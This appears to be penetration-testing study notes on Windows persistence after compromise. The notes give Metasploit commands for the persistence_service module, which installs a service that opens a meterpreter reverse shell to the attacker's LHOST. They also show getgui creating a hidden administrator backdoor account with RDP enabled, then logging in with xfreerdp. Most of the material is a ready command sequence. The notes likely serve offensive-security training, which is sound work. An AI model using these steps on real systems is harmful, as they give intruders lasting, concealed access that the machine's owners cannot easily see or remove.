# Windows Persistence

## Contents
- []()
- []()
- []()
- []()
- []()
- []()
- []()
- []()

## MetaSploit Module: persistence_service

### Set-Up
- You have exploited a vulnerable service, gained access, and escalated your privileges via MetaSploit.
- You have a meterpreter session and can do some initial enumeration (`sysinfo`, `getuid`).

### Module: persistance_service
- Background your meterpreter session.
```
> search persistence_service
> use /exploit/windows/local/persistence_service
> set LHOST [attack ip]
> set LPORT [something not in conflict with your current meterpreter session]
> set SESSION [your meterpreter session id#; must have admin privs]
> set PAYLOAD windows/meterpreter/reverse_tcp
> run
```
- This exploit will generate and upload an executable to the target system.
  - It will then make it a persistent service on that machine.
  - So, every time the service is running it will establish a reverse shell to your attack machine.
- And within a few seconds of running the module you should get a meterpeter session reverse shell from the target.

## Persistence via RDP

### The Idea
- We create a backdoor user account.
  - We add that account to the Administrators group
  - That way our backdoor user has admin privs
  - Then we'll enable RDP (Remote Desktop Protocol) so we can login to the target whenever we want.
- Resource: https://www.offsec.com/metasploit-unleashed/enabling-remote-desktop/

### Set-Up
- You have exploited a vulnerable service, gained access, and escalated your privileges via MetaSploit.
- You have a meterpreter session and can do some initial enumeration (`sysinfo`, `getuid`).
- Make sure you migrate your meterpreter session to a stable process.

### Create the Backdoor Account: getgui
- PROBLEM: When you create a new user on a Windows machine, that user will show up on the logon screen when the system is booted.
  - We'll need to fix that so it doesn't appear (hide the user from the logon screen)
- This whole process can be simplified into one command (msfconsole): getgui
- From the msfconsole prompt, run the script...
```
> run getgui -e -u [name] -p [password]
```
- `getgui` : This script enables Remote Desktop and creates a user account for you to log into it with.
  - It first checks to see whether the RDP service is enabled; if it is disabled, it will enable it.
  - It will also create a new user and hide that user from the Windows login screen.
- `-e` : enable (checks to see if RDP is running; if not, it enables it: REQUIRED)
- `-u` : create new user
- `-p` : password

### Remote In with xfreerdp
```
xfreerdp /u:[username] /p:[password] /v:[target ip]
```
